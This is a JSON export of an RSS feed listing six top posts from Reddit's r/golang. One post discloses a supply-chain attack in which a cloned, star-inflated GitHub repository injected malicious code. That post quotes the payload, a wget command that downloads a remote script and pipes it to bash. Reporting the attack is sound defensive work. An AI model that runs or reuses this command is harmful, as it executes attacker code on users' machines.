{"id":"USgKoryE83j5SszZjyr68sh7DjLn4j6MWUagcNjQES7kQ1n2HXebXN4bJpBn8stf6LqSMrbny1unc4R1hi6qmf","title":"top scoring links : golang","displayTitle":"Reddit - Go","url":"https://www.reddit.com/r/golang/top/.rss?sort=top&t=day&limit=6","feedLink":"https://www.reddit.com/r/golang/top/?sort=top&t=day&limit=6","isQuery":false,"isEmpty":false,"isHidden":false,"itemCount":6,"items":[{"title":"SuperMuxer: tiny and compact, dependency-free package to configure your HTTP routes","url":"https://www.reddit.com/r/golang/comments/1jcmfrb/supermuxer_tiny_and_compact_dependencyfree/","date":1742134690,"author":"/u/FlairPrime","guid":246,"unread":true,"content":"<p>Super  Go package to configure your HTTP routes using only the . Define routes, middlewares, groups, and subgroups effortlessly!</p><p>This package acts like a : It is  and , providing everything you need in just  file with <strong>less than 200 lines of code</strong>.</p><ul><li>You want to  define your HTTP routes while using  the standard library.</li><li>You want to define  for your routes, groups, and subgroups while still relying on the standard library.</li><li>You  want to use  bloated with excessive functionalities that you might never use.</li></ul>","contentLength":501,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I implemented my own regex engine in Go","url":"https://github.com/bogdan-deac/regex","date":1742069910,"author":"/u/Constant_Apple_577","guid":248,"unread":true,"content":"<p>Automata theory and formal languages always seemed cool to me, so I decided to implement my own regexes. It's just a toy project but I had a lot of fun doing it so far and I'll see how far I can take it.</p>","contentLength":203,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jc455b/i_implemented_my_own_regex_engine_in_go/"},{"title":"My 6 months with the GoTH stack: building front-ends with Go, HTML and a little duct tape","url":"https://open.substack.com/pub/thefridaydeploy/p/my-6-months-with-the-goth-stack-building?r=36rml&amp;utm_campaign=post&amp;utm_medium=web&amp;showWelcomeOnShare=true","date":1742061490,"author":"/u/theothertomelliott","guid":249,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jc0zby/my_6_months_with_the_goth_stack_building/"},{"title":"Someone copied our GitHub project, made it look more trustworthy by adding stars from many fake users, and then injected malicious code at runtime for potential users.","url":"https://www.reddit.com/r/golang/comments/1jbzuot/someone_copied_our_github_project_made_it_look/","date":1742058511,"author":"/u/_a8m_","guid":251,"unread":true,"content":"<p>Something crazy I found today before it went viral is that someone copied our GitHub project, faked stars for credibility from accounts created just a few weeks ago, and then injected malicious code at runtime for potential users.</p><pre><code>wget -O - https://requestbone.fun/storage/de373d0df/a31546bf | /bin/bash &amp; </code></pre><p>I went over some of the stargazers, and it looks like it was done for other projects too. I expect the impact is much bigger that just our project.</p><p> It's hard to detect the full impact. The attacker obfuscates the code, changing identifiers and scrambling the byte array order, so you can't easily search for it on GitHub. This makes it nearly impossible to track the full impact unless GitHub steps up and helps resolve this issue (I reported these repos to GitHub support).</p>","contentLength":779,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Is there a Nodejs library you wish existed for Golang?","url":"https://www.reddit.com/r/golang/comments/1jby40e/is_there_a_nodejs_library_you_wish_existed_for/","date":1742053901,"author":"/u/prisencotech","guid":247,"unread":true,"content":"<div><p>People often cite the availability of third party libraries for Node as the reason to prefer it over Golang. Has anyone run into a time when they had to use Node or made do without because a third party library didn't exist?</p></div>   submitted by   <a href=\"https://www.reddit.com/user/prisencotech\"> /u/prisencotech </a>","contentLength":259,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"New Viper release with major improvements","url":"https://www.reddit.com/r/golang/comments/1jbx8d6/new_viper_release_with_major_improvements/","date":1742051515,"author":"/u/sagikazarmark","guid":250,"unread":true,"content":"<p>It comes with a number of improvements:</p><ul><li>Heavily reduced number of third-party dependencies</li><li>New encoding layer for custom encoding formats</li><li>BREAKING: dropped HCL, INI and Java properties from the core (still possible to use through external libraries)</li><li>New file search API allows customizing how Viper looks for config files</li></ul><p>These features has been around for some time in alpha releases, though I haven't received a lot of feedback, so I'm posting here now in the hope that people using Viper will give some after upgrading.</p><p>I worked hard to minimize breaking changes, but it's possible some slipped in. If you find any, feel free to open an issue.</p>","contentLength":640,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null}],"tags":["dev","reddit","go"]}